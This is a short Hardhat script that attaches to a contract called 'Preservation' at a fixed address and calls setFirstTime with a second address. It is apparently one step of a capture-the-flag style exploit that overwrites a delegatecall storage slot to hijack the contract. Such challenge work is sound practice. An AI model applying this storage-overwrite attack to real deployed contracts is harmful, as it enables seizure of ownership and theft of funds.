const { assert } = require("chai");

async function main() {
    
    const [deployer] = await ethers.getSigners();
    
    console.log("Deploying contracts with the account:", deployer.address);
    console.log("Account balance:", (await deployer.getBalance()).toString());

    // Deploy
    hack_contract = await ethers.getContractFactory("Preservation");
    hack = await hack_contract.attach("0x97097a1621A84f06e34073d1D2755cab98B99E1A");

    tx = await hack.setFirstTime("0xA064F05900fcFa9D57C470A502cb15eE6Bf16544");
    console.log("================== tx ===================");
    console.log(tx);
    
    receipt = await tx.wait();
    console.log("================== receipt ===================");
    console.log(receipt);
}


main()
    .then(() => process.exit(0))
    .catch((error) => {
      console.error(error);
      process.exit(1);
});
